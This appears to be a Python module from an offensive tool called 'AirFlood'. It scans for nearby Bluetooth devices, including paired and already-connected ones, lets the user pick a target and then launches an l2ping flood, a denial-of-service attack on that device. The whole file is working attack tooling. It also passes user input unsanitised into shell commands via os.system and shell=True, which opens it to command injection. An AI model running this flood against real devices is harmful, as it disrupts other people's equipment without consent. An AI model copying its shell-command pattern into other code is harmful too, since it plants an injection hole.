import os
import re
import time
import subprocess

from utils import banner

ACCENT = banner.MODULE_THEMES["bluetooth"]["accent"]


def ensure_interface_up(interface):
    status = subprocess.run(["hciconfig", interface], capture_output=True, text=True)
    output = status.stdout + status.stderr

    if status.returncode != 0 or "No such device" in output:
        banner.error(f"bluetooth interface '{interface}' not found")
        raise banner.BackToMenu()

    if "UP RUNNING" in output:
        return

    banner.warn(f"{interface} is down, bringing it up...")
    subprocess.run(["sudo", "hciconfig", interface, "up"])

    status = subprocess.run(["hciconfig", interface], capture_output=True, text=True)
    if "UP RUNNING" not in status.stdout:
        banner.error(f"could not bring {interface} up — check the adapter and try again")
        raise banner.BackToMenu()

    banner.ok(f"{interface} is up")


def get_bluetooth_interface():
    banner.module_banner("bluetooth")
    banner.section("select a bluetooth interface", accent=ACCENT)
    interfaces = subprocess.check_output(
        "hciconfig | grep -E 'hci[0-9]+:|Bus|UP RUNNING|DOWN'", shell=True, text=True
    )
    # hciconfig's output uses raw tabs, which expand to inconsistent widths
    # depending on the terminal's tab stops — normalize to spaces so the
    # box border stays aligned regardless
    lines = [line.expandtabs(4) for line in interfaces.splitlines() if line.strip()]
    if not lines:
        lines = [f"{banner.C.MUTED}no bluetooth interfaces found{banner.C.RESET}"]

    banner.box(lines, title="available interfaces", accent=ACCENT)
    interface = banner.prompt("interface (e.g. hci0)", accent=ACCENT)
    ensure_interface_up(interface)
    return interface


def scan_bluetooth_devices(interface, scan_length=16):
    """Run hcitool scan in the background while animating a spinner/progress bar
    in the foreground — hcitool gives no live progress, so this is a
    time-based animation rather than a real progress readout."""
    approx_duration = scan_length * 1.28

    proc = subprocess.Popen(
        f"hcitool -i {interface} scan --length={scan_length}",
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )

    start = time.monotonic()
    tick = 0
    try:
        while proc.poll() is None:
            elapsed = time.monotonic() - start
            banner.module_banner("bluetooth")
            bar_width = max(10, min(32, banner.width() - 24))
            spin = banner.spinner_frame(tick, accent=ACCENT)
            bar = banner.progress_bar(elapsed, approx_duration, bar_width=bar_width, accent=ACCENT)
            remaining = max(0, round(approx_duration - elapsed))
            banner.box(
                [f"{spin}  {bar}", f"~{remaining:>2}s left"],
                title="scanning for devices",
                accent=ACCENT,
            )
            tick += 1
            time.sleep(0.3)
    except KeyboardInterrupt:
        proc.terminate()
        raise

    output, _ = proc.communicate()
    return output


MAC_RE = re.compile(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})")


def get_known_devices(interface):
    """Paired/previously-seen devices via bluetoothctl — this list survives
    even when a device isn't currently answering inquiry scans."""
    known = {}
    try:
        output = subprocess.run(
            ["bluetoothctl", "-t", "5", "devices"],
            capture_output=True, text=True, timeout=8,
        ).stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return known
    for line in output.splitlines():
        parts = line.split(maxsplit=2)
        if len(parts) >= 2 and parts[0] == "Device" and MAC_RE.fullmatch(parts[1]):
            known[parts[1]] = parts[2] if len(parts) > 2 else ""
    return known


def get_connected_macs(interface):
    """Devices with a live ACL link right now via `hcitool con` — this is how
    an already-connected speaker/headset shows up even though it stopped
    responding to inquiry scans while paired to something else."""
    connected = set()
    try:
        output = subprocess.run(
            ["hcitool", "-i", interface, "con"], capture_output=True, text=True, timeout=5,
        ).stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return connected
    for line in output.splitlines():
        m = MAC_RE.search(line)
        if m:
            connected.add(m.group(1))
    return connected


def scan_attack():
    while True:
        banner.module_banner("bluetooth")
        banner.section("bluetooth menu", accent=ACCENT)
        choice = banner.menu(
            [
                ("1", "Scan and attack", "discover nearby devices and flood one"),
                ("2", "Back", "return to the AirFlood main menu"),
            ],
            accent=ACCENT,
        )
        if choice == "1":
            bluetooth_interface = get_bluetooth_interface()
            break
        elif choice == "2":
            raise banner.BackToMenu()
        else:
            banner.warn("invalid choice, try again")

    # hcitool's inquiry length is in 1.28s units; the default (8 -> ~10s) often
    # isn't long enough to catch every nearby device, so give it more time
    bluetooth_scan = scan_bluetooth_devices(bluetooth_interface, scan_length=16)
    lines = bluetooth_scan.splitlines()
    del lines[0]

    # an inquiry scan only finds devices currently in discoverable mode — a
    # speaker/headset already connected to something else usually stops
    # responding to inquiries, so merge in bluetoothctl's known-devices list
    # and hcitool's live-connection list to catch those too
    devices = {}
    for line in lines:
        info = line.split()
        if not info:
            continue
        devices[info[0]] = " ".join(info[1:])

    known = get_known_devices(bluetooth_interface)
    for mac, name in known.items():
        devices.setdefault(mac, name)

    connected_macs = get_connected_macs(bluetooth_interface)
    for mac in connected_macs:
        devices.setdefault(mac, "")

    array = []
    box_lines = [
        f"{'id':<5}{'mac address':<22}{'status':<12}{'device name'}",
        f"{'--':<5}{'-----------':<22}{'------':<12}{'-----------'}",
    ]
    for index, (device_mac, device_name) in enumerate(devices.items(), start=1):
        status = "connected" if device_mac in connected_macs else ""
        array.append(device_mac)
        box_lines.append(f"{index:<5}{device_mac:<22}{status:<12}{device_name}")

    if not array:
        box_lines.append(f"{banner.C.MUTED}no devices found{banner.C.RESET}")

    banner.module_banner("bluetooth")
    banner.box(box_lines, title="devices found", accent=ACCENT)
    banner.ok("scan complete")

    target_id = banner.prompt("target id or mac address", accent=ACCENT)
    try:
        target_address = array[int(target_id) - 1]
    except (ValueError, IndexError):
        target_address = target_id

    if len(target_address) < 1:
        banner.error("target address is missing")
        raise banner.BackToMenu()

    try:
        packet_size = int(banner.prompt("packet size (max: 600)", accent=ACCENT))
        thread_size = int(banner.prompt("threads count", accent=ACCENT))
    except ValueError:
        banner.error("packet size and threads must be integers")
        raise banner.BackToMenu()

    banner.module_banner("bluetooth")
    banner.section("launching attack", accent=ACCENT)
    print(f"  target : {target_address}")
    print(f"  size   : {packet_size}")
    print(f"  threads: {thread_size}")
    banner.countdown(3, "attacking")

    try:
        os.system(f"l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}")
    except KeyboardInterrupt:
        banner.warn("attack aborted")


if __name__ == "__main__":
    try:
        scan_attack()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        time.sleep(0.1)
        banner.warn("aborted")
    except Exception as e:
        time.sleep(0.1)
        banner.error(str(e))
